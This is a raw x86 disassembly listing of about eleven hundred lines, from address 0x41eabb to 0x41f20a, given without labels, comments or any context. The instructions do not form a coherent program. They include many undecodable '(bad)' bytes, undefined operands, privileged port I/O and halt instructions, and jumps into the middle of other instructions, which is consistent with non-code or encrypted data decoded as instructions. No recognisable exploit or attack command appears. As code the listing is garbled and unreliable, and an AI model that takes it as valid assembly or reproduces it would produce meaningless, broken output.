  41eabb:	push   ebp
  41eabc:	sub    DWORD PTR [ebp-0x71fb4c7],edi
  41eac2:	das    
  41eac3:	adc    bh,0x26
  41eac6:	pop    esp
  41eac7:	jb     0x41eb30
  41eac9:	pop    ecx
  41eaca:	aas    
  41eacb:	lahf   
  41eacc:	mov    BYTE PTR [edi+0x69fef83],bl
  41ead2:	push   edx
  41ead3:	sti    
  41ead4:	and    edx,0xffffffb3
  41ead7:	das    
  41ead8:	daa    
  41ead9:	mov    eax,ds:0x2f5afae9
  41eade:	inc    edi
  41eadf:	push   cs
  41eae0:	jle    0x41eb55
  41eae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eae3:	je     0x41eae3
  41eae5:	lods   eax,DWORD PTR ds:[esi]
  41eae6:	push   ss
  41eae7:	or     esp,esp
  41eae9:	test   al,0x17
  41eaeb:	jp     0x41eab2
  41eaed:	adc    cl,BYTE PTR [ebx+0x73775686]
  41eaf3:	sahf   
  41eaf4:	mov    dl,0xa7
  41eaf6:	mov    edi,0x9e0a14b6
  41eafb:	jmp    0x41eb2b
  41eafd:	mov    dh,0x1c
  41eaff:	sbb    BYTE PTR [esi],bl
  41eb01:	lahf   
  41eb02:	addr16 add esp,ecx
  41eb05:	cld    
  41eb06:	ss int3 
  41eb08:	mov    eax,ds:0xd6f5f1dc
  41eb0d:	cmp    al,0xd
  41eb0f:	sbb    DWORD PTR [esi+0x41a9c7db],ebp
  41eb15:	clc    
  41eb16:	std    
  41eb17:	xor    dh,dh
  41eb19:	arpl   si,si
  41eb1b:	int    0xf5
  41eb1d:	ret    0xf554
  41eb20:	sahf   
  41eb21:	ins    BYTE PTR es:[edi],dx
  41eb22:	or     esi,ebx
  41eb24:	aad    0x0
  41eb26:	inc    edi
  41eb27:	loop   0x41eab9
  41eb29:	sub    eax,0x178d4535
  41eb2e:	mov    fs,WORD PTR [esi]
  41eb30:	push   0xffffffbe
  41eb32:	shr    DWORD PTR [ecx+eax*1],1
  41eb35:	bound  esi,QWORD PTR ds:0xf767b084
  41eb3b:	aad    0x87
  41eb3d:	inc    edi
  41eb3e:	popa   
  41eb3f:	lock sbb al,bh
  41eb42:	stc    
  41eb43:	xchg   edi,eax
  41eb44:	popa   
  41eb45:	fidiv  DWORD PTR [ecx+0x503ad40e]
  41eb4b:	mov    dl,0xd4
  41eb4d:	(bad)  
  41eb4e:	(bad)  
  41eb4f:	outs   dx,DWORD PTR ds:[esi]
  41eb50:	ficomp DWORD PTR [eax]
  41eb52:	(bad)  
  41eb53:	shl    esp,1
  41eb55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb56:	retf   0x30e
  41eb59:	not    dl
  41eb5b:	das    
  41eb5c:	mov    eax,ds:0x80058287
  41eb61:	xor    BYTE PTR [ebx+esi*4-0x1b],0x7b
  41eb66:	sub    BYTE PTR [edi+edi*1-0x79],dl
  41eb6a:	cmp    al,0xa1
  41eb6c:	jp     0x41eb52
  41eb6e:	xor    BYTE PTR [edi-0x34],ah
  41eb71:	jne    0x41eb18
  41eb73:	lods   eax,DWORD PTR ds:[esi]
  41eb74:	pop    edx
  41eb75:	pop    ss
  41eb76:	sub    eax,0xa4bba324
  41eb7b:	inc    ebx
  41eb7c:	retf   0xdbd
  41eb7f:	mov    cl,0x3
  41eb81:	or     DWORD PTR [edi-0x45279ebb],eax
  41eb87:	mov    ds:0xa6d179ef,al
  41eb8c:	sbb    BYTE PTR [eax+0x39],0xe0
  41eb90:	push   edi
  41eb91:	mov    dl,BYTE PTR [eax+ecx*8]
  41eb94:	outs   dx,DWORD PTR ds:[esi]
  41eb95:	loope  0x41eb88
  41eb97:	dec    esi
  41eb98:	push   esp
  41eb99:	not    BYTE PTR [edi]
  41eb9b:	popf   
  41eb9c:	(bad)  
  41eb9e:	sub    eax,0xb626cac0
  41eba3:	jnp    0x41ebb1
  41eba5:	and    BYTE PTR [edx+0x122aef0],dl
  41ebab:	popf   
  41ebac:	das    
  41ebad:	jmp    0xca165c5e
  41ebb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebb3:	call   0x21c05e7f
  41ebb8:	stc    
  41ebb9:	loop   0x41eb8c
  41ebbb:	jbe    0x41ebb1
  41ebbd:	dec    ebp
  41ebbe:	rcr    DWORD PTR gs:[esi],0x86
  41ebc2:	bound  eax,QWORD PTR [esp+eax*4-0x37729c75]
  41ebc9:	(bad)  
  41ebca:	push   esp
  41ebcb:	pop    ss
  41ebcc:	ds bnd jns 0x41ec41
  41ebd0:	mov    dl,0x3f
  41ebd2:	enter  0x6720,0x1f
  41ebd6:	mov    bl,0x4d
  41ebd8:	mov    edi,0x4fbf9deb
  41ebdd:	adc    edi,0xffffffd4
  41ebe0:	or     DWORD PTR [edi+0x15481897],0x831b4c09
  41ebea:	popa   
  41ebeb:	inc    ecx
  41ebec:	int3   
  41ebed:	stos   BYTE PTR es:[edi],al
  41ebee:	mov    ch,0xb
  41ebf0:	scas   al,BYTE PTR es:[edi]
  41ebf1:	mov    ch,0xa3
  41ebf3:	aaa    
  41ebf4:	sub    esi,DWORD PTR [ebp+0xba85948]
  41ebfa:	push   esp
  41ebfb:	add    dl,bh
  41ebfd:	sub    eax,0xfaaa838f
  41ec02:	(bad)  
  41ec03:	js     0x41ebeb
  41ec05:	xchg   esi,eax
  41ec06:	loop   0x41ebc0
  41ec08:	mov    ch,0x23
  41ec0a:	inc    esp
  41ec0b:	cmp    eax,0x6fc3799c
  41ec10:	(bad)  
  41ec11:	lock jbe 0x41ebc9
  41ec14:	outs   dx,BYTE PTR ds:[esi]
  41ec15:	out    dx,al
  41ec16:	sbb    al,0xf2
  41ec18:	sbb    ecx,DWORD PTR [ebp-0x16]
  41ec1b:	xor    eax,0xb43d095e
  41ec20:	sbb    edi,0xffffff93
  41ec23:	js     0x41ebd3
  41ec25:	test   BYTE PTR cs:[edx+0x624b3720],bl
  41ec2c:	sbb    eax,0x81e75b60
  41ec31:	enter  0x301b,0xfe
  41ec35:	into   
  41ec36:	and    al,0x45
  41ec38:	sbb    al,0xdd
  41ec3a:	popf   
  41ec3b:	fs pop ds
  41ec3d:	and    edx,DWORD PTR [ecx+0x2c]
  41ec40:	mov    esi,0xd753927d
  41ec45:	xor    BYTE PTR [edi+0x5d],dh
  41ec48:	pop    ecx
  41ec49:	jno    0x41ecc5
  41ec4b:	nop
  41ec4c:	sbb    cl,BYTE PTR [eax+0x62]
  41ec4f:	ret    
  41ec50:	ins    DWORD PTR es:[edi],dx
  41ec51:	call   DWORD PTR [esi]
  41ec53:	push   edx
  41ec54:	iret   
  41ec55:	(bad)  
  41ec56:	xor    cl,BYTE PTR [edx-0x1c]
  41ec59:	ins    DWORD PTR es:[edi],dx
  41ec5a:	scas   eax,DWORD PTR es:[edi]
  41ec5b:	icebp  
  41ec5c:	in     al,dx
  41ec5d:	mov    bh,BYTE PTR [edi]
  41ec5f:	jae    0x41ec79
  41ec61:	scas   al,BYTE PTR es:[edi]
  41ec62:	ja     0x41ec32
  41ec64:	js     0x41ec73
  41ec66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec67:	mov    dh,0x5d
  41ec69:	retf   
  41ec6a:	stc    
  41ec6b:	repnz push ecx
  41ec6d:	jl     0x41ec5d
  41ec6f:	or     BYTE PTR [esi],0xe4
  41ec72:	ja     0x41ec4e
  41ec74:	xchg   esp,eax
  41ec75:	mov    edi,0xa06c459f
  41ec7a:	pop    ss
  41ec7b:	mov    eax,ebp
  41ec7d:	and    esi,ebx
  41ec7f:	mov    al,0x24
  41ec81:	test   DWORD PTR [ecx],ebp
  41ec83:	out    0xcd,eax
  41ec85:	push   edx
  41ec86:	jp     0x41ecbc
  41ec88:	sub    DWORD PTR [edi-0x1b],edx
  41ec8b:	dec    edi
  41ec8c:	adc    ch,BYTE PTR [edi+0x256a170f]
  41ec92:	shl    BYTE PTR [edx],0x80
  41ec95:	dec    edx
  41ec96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec97:	xor    BYTE PTR [esi+ecx*1],0xb0
  41ec9b:	ret    
  41ec9c:	dec    edi
  41ec9d:	dec    ecx
  41ec9e:	outs   dx,DWORD PTR ds:[esi]
  41ec9f:	dec    esp
  41eca0:	mov    eax,0xdb3e6d6d
  41eca5:	int    0xdd
  41eca7:	cmc    
  41eca8:	out    dx,al
  41eca9:	rcl    DWORD PTR [edi-0x22189de3],cl
  41ecaf:	xor    esp,DWORD PTR [esi]
  41ecb1:	add    eax,ebx
  41ecb3:	inc    edi
  41ecb4:	cmp    BYTE PTR [eax-0x3f],al
  41ecb7:	in     al,0x13
  41ecb9:	ins    DWORD PTR es:[edi],dx
  41ecba:	sbb    BYTE PTR [ecx-0x20a374e0],al
  41ecc0:	pushf  
  41ecc1:	xchg   esp,eax
  41ecc2:	sbb    cl,0xd6
  41ecc5:	test   al,0xf1
  41ecc7:	add    cl,BYTE PTR [ecx-0x66656f71]
  41eccd:	xchg   esi,eax
  41ecce:	add    DWORD PTR [ebp+0x74],esi
  41ecd1:	repz out 0xd,al
  41ecd4:	jge    0x41ecdc
  41ecd6:	fwait
  41ecd7:	adc    DWORD PTR [ebx+0x437a4297],edi
  41ecdd:	mov    DWORD PTR [edi],eax
  41ecdf:	jnp    0x41ed5c
  41ece1:	hlt    
  41ece2:	sti    
  41ece3:	or     DWORD PTR [ebx-0x3353e35f],eax
  41ece9:	cld    
  41ecea:	adc    BYTE PTR [ebx],cl
  41ecec:	loope  0x41ed12
  41ecee:	imul   eax,DWORD PTR [esi-0x61],0x31fed187
  41ecf5:	xchg   ecx,eax
  41ecf6:	cmp    BYTE PTR ds:0xab68f32e,dl
  41ecfc:	mov    ecx,0xf98cd6bb
  41ed01:	push   0xeca7dc0d
  41ed06:	xchg   ebp,eax
  41ed07:	or     edi,DWORD PTR [ebx]
  41ed09:	xchg   ebx,eax
  41ed0a:	xor    al,0xa7
  41ed0c:	ja     0x41ed2d
  41ed0e:	(bad)  
  41ed0f:	fmulp  st(0),st
  41ed11:	pop    ebx
  41ed12:	in     eax,0x91
  41ed14:	push   ecx
  41ed15:	adc    eax,0x2b370d68
  41ed1a:	and    ch,dl
  41ed1c:	mov    WORD PTR gs:[edx-0xed066ea],ss
  41ed23:	pushf  
  41ed24:	pop    edi
  41ed25:	sahf   
  41ed26:	sbb    DWORD PTR [eax+0x23291ae1],eax
  41ed2c:	mov    edi,0xb1539100
  41ed31:	sub    DWORD PTR [eax+0x2d],ebx
  41ed34:	(bad)  
  41ed35:	gs ret 
  41ed37:	mov    al,ds:0x7ae5d156
  41ed3c:	xor    al,0xc6
  41ed3e:	dec    esi
  41ed3f:	push   ds
  41ed40:	dec    edi
  41ed41:	mov    eax,0x24feb6de
  41ed46:	loope  0x41ed89
  41ed48:	(bad)
  41ed4b:	dec    esp
  41ed4c:	(bad)  
  41ed4d:	adc    al,0xe3
  41ed4f:	out    dx,eax
  41ed50:	int3   
  41ed51:	pusha  
  41ed52:	aas    
  41ed53:	sub    ah,BYTE PTR [ebx+eiz*8-0x32de5893]
  41ed5a:	xor    bh,BYTE PTR [eax-0x28]
  41ed5d:	push   eax
  41ed5e:	lea    ebx,[edi+0x4b41c2e7]
  41ed64:	scas   eax,DWORD PTR es:[edi]
  41ed65:	add    eax,0x25fe2585
  41ed6a:	or     DWORD PTR [ebp-0x6e],edx
  41ed6d:	fs pop eax
  41ed6f:	adc    bl,BYTE PTR [ebx-0x3d346922]
  41ed75:	sub    ch,BYTE PTR [esi+0x2b7e1ae5]
  41ed7b:	adc    BYTE PTR [eax+0x2e9c7dfb],dl
  41ed81:	add    eax,0xb97f843c
  41ed86:	pop    ss
  41ed87:	mov    ebx,0x8021eb4b
  41ed8c:	ret    0xd5bd
  41ed8f:	mov    ch,0xed
  41ed91:	push   ebx
  41ed92:	hlt    
  41ed93:	pop    ecx
  41ed94:	add    eax,0x1b0d791a
  41ed99:	out    0x16,eax
  41ed9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed9c:	mov    dh,bl
  41ed9e:	test   BYTE PTR [ebp-0x36263916],dl
  41eda4:	adc    BYTE PTR [edx],ah
  41eda6:	sbb    BYTE PTR [edx-0x70],ah
  41eda9:	sbb    BYTE PTR [eax+eiz*8],dh
  41edac:	in     al,0x60
  41edae:	push   ecx
  41edaf:	sbb    eax,ecx
  41edb1:	arpl   WORD PTR [eax-0x20],cx
  41edb4:	out    0xdd,al
  41edb6:	dec    edx
  41edb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb8:	inc    ebp
  41edb9:	imul   BYTE PTR [esi+0x76]
  41edbc:	xchg   BYTE PTR [edx-0x9],bh
  41edbf:	inc    edx
  41edc0:	mov    esi,0x8d5e29c1
  41edc5:	jle    0x41ee11
  41edc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edc8:	mov    DWORD PTR [ecx],esp
  41edca:	sub    al,0x5b
  41edcc:	xchg   esi,eax
  41edcd:	and    esi,edi
  41edcf:	retf   
  41edd0:	clc    
  41edd1:	xchg   DWORD PTR [ebx-0x66],ebx
  41edd4:	ds pop ebp
  41edd6:	jg     0x41edd5
  41edd8:	or     edx,DWORD PTR [ebp+0x5474b62b]
  41edde:	and    esp,DWORD PTR [eax-0x62ef9c50]
  41ede4:	adc    eax,0x2c5eb026
  41ede9:	mov    DWORD PTR [ebp-0x3c],0xd40927a5
  41edf0:	lods   eax,DWORD PTR ds:[esi]
  41edf1:	or     DWORD PTR [ecx+0x2f6e9fe7],ebp
  41edf7:	mov    dl,0x9a
  41edf9:	fadd   QWORD PTR [edx]
  41edfb:	mov    ah,0xde
  41edfd:	(bad)  
  41edfe:	popf   
  41edff:	call   0x831f:0x3e45de9f
  41ee06:	cmp    BYTE PTR [ecx+0xc6bc119],al
  41ee0c:	mov    ah,0x0
  41ee0e:	add    BYTE PTR [eax],al
  41ee10:	add    BYTE PTR [eax],al
  41ee12:	push   edx
  41ee13:	push   ecx
  41ee14:	cmp    BYTE PTR [ebx],al
  41ee16:	cmp    ebp,DWORD PTR [ebx+0x7b]
  41ee19:	push   ecx
  41ee1a:	pop    edx
  41ee1b:	mov    ch,0xf5
  41ee1d:	lahf   
  41ee1e:	in     eax,0x67
  41ee20:	sbb    bl,BYTE PTR [ebx]
  41ee22:	repz push 0x4f30001
  41ee28:	add    BYTE PTR [eax],al
  41ee2a:	ror    DWORD PTR [edx-0x7a0a020d],cl
  41ee30:	rol    DWORD PTR ds:0x2782fb80,1
  41ee36:	imul   BYTE PTR [ebx+ebp*4-0x46]
  41ee3a:	push   es
  41ee3b:	lahf   
  41ee3c:	fstp   DWORD PTR [ebx+0x4c884ef0]
  41ee42:	mov    dh,0x7d
  41ee44:	inc    eax
  41ee45:	push   ecx
  41ee46:	mov    ch,0x9f
  41ee48:	xchg   BYTE PTR [edi],dl
  41ee4a:	dec    edx
  41ee4b:	pop    ebx
  41ee4c:	xor    esp,ecx
  41ee4e:	add    BYTE PTR [edi-0x4c0d8844],0x7e
  41ee55:	bndstx [ecx],(bad)
  41ee58:	scas   al,BYTE PTR es:[edi]
  41ee59:	xor    DWORD PTR [edx],ebx
  41ee5b:	mov    esi,0x1b10866b
  41ee60:	xchg   ebx,eax
  41ee61:	ret    0x44a3
  41ee64:	lds    ecx,FWORD PTR [esp+eiz*2]
  41ee67:	jne    0x41eea5
  41ee69:	mov    dl,0xbe
  41ee6b:	mov    bl,0x85
  41ee6d:	repnz arpl dx,bp
  41ee70:	mov    dl,0x1d
  41ee72:	push   edi
  41ee73:	outs   dx,BYTE PTR ds:[esi]
  41ee74:	mov    DWORD PTR [edi-0x2b735f49],ebx
  41ee7a:	push   es
  41ee7b:	xchg   DWORD PTR [edi-0x111b80e],edi
  41ee81:	jno    0x41ee8c
  41ee83:	dec    ebp
  41ee84:	sbb    eax,0x331ebb82
  41ee89:	add    BYTE PTR [edi+ebp*1],bh
  41ee8c:	loopne 0x41eec4
  41ee8e:	xchg   ebp,eax
  41ee8f:	xchg   esi,eax
  41ee90:	les    edi,FWORD PTR [esi-0x5e6baf9c]
  41ee96:	sbb    ebx,0x3924ff2
  41ee9c:	lea    eax,[edx+0x553dd3e6]
  41eea2:	test   eax,0x6443b911
  41eea7:	xor    eax,0x5a59b002
  41eeac:	push   0x58
  41eeae:	mov    eax,fs:0xa74fb69b
  41eeb4:	sub    al,0xc3
  41eeb6:	aas    
  41eeb7:	in     al,0xd8
  41eeb9:	(bad)  
  41eeba:	xchg   edi,eax
  41eebb:	jg     0x41ee51
  41eebd:	push   edx
  41eebe:	retf   0xc674
  41eec1:	and    edi,DWORD PTR [eax]
  41eec3:	pop    esi
  41eec4:	jge    0x41eeae
  41eec6:	push   0x409d916c
  41eecb:	pop    ecx
  41eecc:	mov    BYTE PTR [edi],dl
  41eece:	xrelease lock add BYTE PTR [esi],0x70
  41eed3:	es scas al,BYTE PTR es:[edi]
  41eed5:	jo     0x41ee9d
  41eed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eed8:	sbb    ah,al
  41eeda:	dec    ebx
  41eedb:	mov    edi,0x4feb1b44
  41eee0:	xchg   DWORD PTR [esi-0x40],ebx
  41eee3:	pop    es
  41eee4:	sbb    DWORD PTR [esp+edi*4],ebx
  41eee7:	pusha  
  41eee8:	mov    ebx,0x3556249d
  41eeed:	mov    eax,0xd7d978
  41eef2:	loop   0x41ef07
  41eef4:	mov    eax,0x5557870c
  41eef9:	and    BYTE PTR [eax-0x1c68c468],ah
  41eeff:	test   al,0x8a
  41ef01:	or     edx,DWORD PTR [edi+0x67d5809b]
  41ef07:	sbb    ebp,ebx
  41ef09:	shr    DWORD PTR [eax-0x7c02995],1
  41ef0f:	dec    ecx
  41ef10:	cmp    BYTE PTR [eax+eax*1],dl
  41ef13:	mov    ch,0xc7
  41ef15:	mov    eax,esi
  41ef17:	mov    ah,0x40
  41ef19:	push   0xcc3659d6
  41ef1e:	add    BYTE PTR ds:0x61d75255,cl
  41ef24:	sti    
  41ef25:	neg    BYTE PTR [eax-0x35e2726f]
  41ef2b:	mov    ebp,0xfb89cae1
  41ef30:	dec    edi
  41ef31:	dec    ecx
  41ef32:	xchg   esp,eax
  41ef33:	fild   DWORD PTR [esi-0x664609a6]
  41ef39:	lock mov DWORD PTR [edx+0x7775588e],esi
  41ef40:	imul   DWORD PTR [ebp+0x607dbdbd]
  41ef46:	mov    eax,ds:0xb14e73ff
  41ef4b:	rcr    DWORD PTR [edi-0x3c],0x1a
  41ef4f:	(bad)  
  41ef50:	pop    ecx
  41ef51:	outs   dx,BYTE PTR ds:[esi]
  41ef52:	sub    DWORD PTR [edi],ecx
  41ef54:	push   cs
  41ef55:	sbb    edi,esp
  41ef57:	jo     0x41efa6
  41ef59:	and    ebx,DWORD PTR [edx+0x3c]
  41ef5c:	push   ecx
  41ef5d:	fimul  WORD PTR [ecx]
  41ef5f:	sub    al,0xcd
  41ef61:	mov    al,0x75
  41ef63:	sti    
  41ef64:	repnz sub eax,0x2ce50e63
  41ef6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef6b:	sub    ch,BYTE PTR [esi]
  41ef6d:	and    eax,0xe7f9c33a
  41ef72:	(bad)  
  41ef73:	dec    edi
  41ef74:	inc    ecx
  41ef75:	arpl   cx,cx
  41ef77:	or     DWORD PTR [bx+si+0x7],eax
  41ef7b:	xor    cl,dh
  41ef7d:	mov    al,ds:0x7e22d436
  41ef82:	stos   BYTE PTR es:[edi],al
  41ef83:	mul    DWORD PTR ds:0x306efd79
  41ef89:	push   es
  41ef8a:	mov    ebp,gs
  41ef8c:	xchg   ebx,eax
  41ef8d:	pop    es
  41ef8e:	adc    DWORD PTR [edx+0x16737f7],esp
  41ef94:	adc    dl,BYTE PTR [edx]
  41ef96:	mov    ah,0xc1
  41ef98:	jb     0x41ef65
  41ef9a:	outs   dx,DWORD PTR ds:[esi]
  41ef9b:	stc    
  41ef9c:	hlt    
  41ef9d:	retf   
  41ef9e:	sbb    ebx,DWORD PTR [esi+eax*2+0x32]
  41efa2:	minps  xmm5,XMMWORD PTR [ebp-0x4b2bdf35]
  41efa9:	adc    ebx,DWORD PTR [edi]
  41efab:	dec    edi
  41efac:	pushw  0x61
  41efaf:	fs jo  0x41ef7b
  41efb2:	mov    edi,ecx
  41efb4:	push   es
  41efb5:	(bad)  
  41efb6:	stc    
  41efb7:	stc    
  41efb8:	mov    al,0xf9
  41efba:	mov    bl,0x5e
  41efbc:	jg     0x41efb8
  41efbe:	daa    
  41efbf:	imul   edi,DWORD PTR [ecx+0x25],0xffffffff
  41efc3:	test   DWORD PTR es:[ecx+0x4830f067],eax
  41efca:	inc    eax
  41efcb:	arpl   sp,bp
  41efcd:	adc    BYTE PTR [eax],dl
  41efcf:	add    eax,0xe8c546a7
  41efd4:	sbb    al,0xb4
  41efd6:	popf   
  41efd7:	jae    0x41effc
  41efd9:	inc    ecx
  41efda:	and    edi,DWORD PTR [ebx+0x4b]
  41efdd:	push   edx
  41efde:	or     edi,DWORD PTR [ecx-0x50]
  41efe1:	jmp    0x41f01b
  41efe3:	ja     0x41f021
  41efe5:	repnz xor al,0xb8
  41efe8:	add    cl,BYTE PTR gs:[ecx]
  41efeb:	mov    esp,0x9ee7547b
  41eff0:	mov    ah,0x7b
  41eff2:	test   al,0xf7
  41eff4:	imul   ecx,DWORD PTR [edi+ebx*4],0xb9489acd
  41effb:	xor    BYTE PTR [eiz*4+0x6017899],al
  41f002:	xchg   esi,eax
  41f003:	in     eax,dx
  41f004:	sub    eax,0x2b555742
  41f009:	and    DWORD PTR [esi],0x31
  41f00c:	fs es clc 
  41f00f:	retf   
  41f010:	imul   ebx,DWORD PTR [edi+0xa],0xad99e886
  41f017:	pop    ebx
  41f018:	sti    
  41f019:	test   edi,edi
  41f01b:	push   edi
  41f01c:	test   al,0x31
  41f01e:	inc    ebx
  41f01f:	mov    cl,0xd3
  41f021:	dec    ebx
  41f022:	loope  0x41efac
  41f024:	mov    al,ds:0xc28eec59
  41f029:	jecxz  0x41f03d
  41f02b:	pop    ebp
  41f02c:	in     eax,0xb2
  41f02e:	push   ds
  41f02f:	push   cs
  41f030:	or     eax,0x3ac5fda1
  41f035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f036:	pop    esi
  41f037:	mov    edx,0xd574a464
  41f03c:	leave  
  41f03d:	cmc    
  41f03e:	es push eax
  41f040:	add    al,0xf8
  41f042:	stos   BYTE PTR es:[edi],al
  41f043:	into   
  41f044:	sbb    ah,bl
  41f046:	mov    fs:0xbdd5f3d5,eax
  41f04c:	and    eax,0xa4e0ae40
  41f051:	cmp    al,0x54
  41f053:	and    bh,BYTE PTR [esi]
  41f055:	rcr    BYTE PTR [edi],0x7c
  41f058:	fsubp  st(4),st
  41f05a:	adc    al,0x70
  41f05c:	test   DWORD PTR [ebx-0x5bdefd22],0x67454e3c
  41f066:	jbe    0x41eff8
  41f068:	adc    cl,cl
  41f06a:	aad    0x1e
  41f06c:	adc    eax,0xcdc2721a
  41f071:	(bad)  
  41f072:	adc    BYTE PTR [eax+0x731b9534],dh
  41f078:	push   esp
  41f079:	imul   edi,DWORD PTR [edx-0x5fc9c86b],0x65
  41f080:	push   DWORD PTR [ecx+0x69]
  41f083:	(bad)  
  41f084:	mov    ebp,0x407eda4c
  41f089:	(bad)  
  41f08a:	cli    
  41f08b:	ds jb  0x41f107
  41f08e:	mov    edi,0xdf28e572
  41f093:	ss jns 0x41f0d3
  41f096:	jmp    0x41f0d0
  41f098:	or     DWORD PTR [ebx-0x1f],0x4d
  41f09c:	mov    cl,0x49
  41f09e:	arpl   ax,si
  41f0a0:	sbb    DWORD PTR [eax],eax
  41f0a2:	pop    ss
  41f0a3:	pop    eax
  41f0a4:	xor    al,0xed
  41f0a6:	push   ds
  41f0a7:	lock loop 0x41f08e
  41f0aa:	inc    eax
  41f0ab:	in     eax,0x60
  41f0ad:	ja     0x41f080
  41f0af:	push   esi
  41f0b0:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41f0b2:	mov    bl,0xa1
  41f0b4:	aas    
  41f0b5:	pop    ebx
  41f0b6:	retf   
  41f0b7:	fwait
  41f0b8:	or     eax,0x2c45c49a
  41f0bd:	sar    DWORD PTR [edx+0x32],0xc3
  41f0c1:	out    0x93,eax
  41f0c3:	mov    dh,bl
  41f0c5:	xchg   DWORD PTR [edx-0x40],esi
  41f0c8:	fisubr WORD PTR ds:[esi]
  41f0cb:	inc    ecx
  41f0cc:	pop    eax
  41f0cd:	mov    WORD PTR [edi-0x62b019b0],?
  41f0d3:	aad    0xa4
  41f0d5:	call   0x22a55465
  41f0da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0db:	jbe    0x41f072
  41f0dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0de:	loopne 0x41f0f1
  41f0e0:	sbb    bh,cl
  41f0e2:	mov    WORD PTR [esi],es
  41f0e4:	shl    BYTE PTR [ecx-0x1f],0x20
  41f0e8:	push   ecx
  41f0e9:	mov    edi,0xd92999df
  41f0ee:	cdq    
  41f0ef:	jp     0x41f16c
  41f0f1:	loope  0x41f0b1
  41f0f3:	add    edi,DWORD PTR [esi+0x27]
  41f0f6:	addr16 pop ds
  41f0f8:	ds cwde 
  41f0fa:	stc    
  41f0fb:	mov    DWORD PTR [ecx],esp
  41f0fd:	loope  0x41f096
  41f0ff:	call   0x25b77233
  41f104:	test   al,0xf3
  41f106:	outs   dx,DWORD PTR ds:[esi]
  41f107:	arpl   WORD PTR [edi-0xb],dx
  41f10a:	fmul   st,st(6)
  41f10c:	mov    ?,WORD PTR [esi-0x58a7dfee]
  41f112:	(bad)  [ebp-0x6c0a0128]
  41f118:	call   0x776266a8
  41f11d:	fistp  QWORD PTR [edi+0x23848665]
  41f123:	xchg   esp,eax
  41f124:	sbb    dl,BYTE PTR [ebp-0x20ce1d51]
  41f12a:	pop    ds
  41f12b:	adc    al,0x44
  41f12d:	fisttp WORD PTR [eax+eiz*2]
  41f130:	arpl   dx,bx
  41f132:	push   0x77
  41f134:	(bad)  
  41f135:	push   edx
  41f136:	inc    ebx
  41f137:	test   BYTE PTR [esi],ch
  41f139:	inc    eax
  41f13a:	push   ebp
  41f13b:	mov    al,al
  41f13d:	sar    BYTE PTR [esi+0x62],0x29
  41f141:	push   esi
  41f142:	(bad)  
  41f143:	jo     0x41f182
  41f145:	mov    dh,0xab
  41f147:	jecxz  0x41f0d2
  41f149:	out    dx,al
  41f14a:	pop    ss
  41f14b:	mov    edi,0x243c5de8
  41f150:	sbb    BYTE PTR [ebx-0x7f469090],dh
  41f156:	pop    ecx
  41f157:	fdivrp st(6),st
  41f159:	push   ecx
  41f15a:	loope  0x41f171
  41f15c:	jbe    0x41f1c7
  41f15e:	aaa    
  41f15f:	sbb    al,0xdc
  41f161:	xor    al,BYTE PTR [ebp-0x45d5b805]
  41f167:	lods   al,BYTE PTR ds:[esi]
  41f168:	adc    BYTE PTR [edx],bl
  41f16a:	xchg   BYTE PTR [si+0x2282],dh
  41f16f:	mov    dl,0x3b
  41f171:	xor    eax,0x48441d52
  41f176:	xor    ch,BYTE PTR [esi]
  41f178:	cmc    
  41f179:	fsubr  QWORD PTR [ecx+0x11]
  41f17c:	ret    
  41f17d:	inc    edx
  41f17e:	sar    ah,cl
  41f180:	shr    DWORD PTR [eax+0x62915ae8],0xeb
  41f187:	dec    ecx
  41f188:	cmp    DWORD PTR [edi-0x3],esi
  41f18b:	sbb    DWORD PTR [ebx-0x6a5e658b],ebp
  41f191:	cmp    DWORD PTR [esi],edi
  41f193:	dec    ebp
  41f194:	sbb    edx,DWORD PTR [ecx-0x2d392917]
  41f19a:	push   0x2f
  41f19c:	(bad)  
  41f19d:	jmp    0x41f16e
  41f19f:	add    eax,0x4302c2d2
  41f1a4:	test   al,0x35
  41f1a6:	push   ebp
  41f1a7:	in     al,0x3b
  41f1a9:	xor    al,bl
  41f1ab:	loop   0x41f159
  41f1ad:	fcom   QWORD PTR [ecx+0x4e]
  41f1b0:	loopne 0x41f15f
  41f1b2:	xchg   edx,eax
  41f1b3:	stc    
  41f1b4:	lock aam 0x9e
  41f1b7:	rcr    BYTE PTR [ebx+0x70],0x7d
  41f1bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1bc:	inc    ecx
  41f1bd:	pop    es
  41f1be:	je     0x41f1ae
  41f1c0:	jge    0x41f1b3
  41f1c2:	pushf  
  41f1c3:	pop    edi
  41f1c4:	rcl    DWORD PTR [esi+0x11212daa],0xf3
  41f1cb:	in     eax,dx
  41f1cc:	fist   DWORD PTR [ebx-0x7200ce1c]
  41f1d2:	je     0x41f18c
  41f1d4:	in     al,dx
  41f1d5:	adc    DWORD PTR [esi],edi
  41f1d7:	mov    eax,0x8caa9b81
  41f1dc:	pop    ds
  41f1dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1de:	fisttp DWORD PTR [eax]
  41f1e0:	dec    ebp
  41f1e1:	xor    ah,al
  41f1e3:	adc    al,0x68
  41f1e5:	addr16 mov ds:0x14f8,eax
  41f1e9:	mov    bh,BYTE PTR [edx]
  41f1eb:	dec    ebx
  41f1ec:	lea    esp,[ebx]
  41f1ee:	mov    ch,0xa7
  41f1f0:	jl     0x41f216
  41f1f2:	pop    ebx
  41f1f3:	or     dh,BYTE PTR [edx-0x413a116d]
  41f1f9:	xor    eax,0xdca22012
  41f1fe:	adc    eax,0x75cfc2d1
  41f203:	add    eax,0x22ce48b
  41f208:	and    DWORD PTR [esi],eax
  41f20a:	mov    ds:0x5dafd8d9,eax
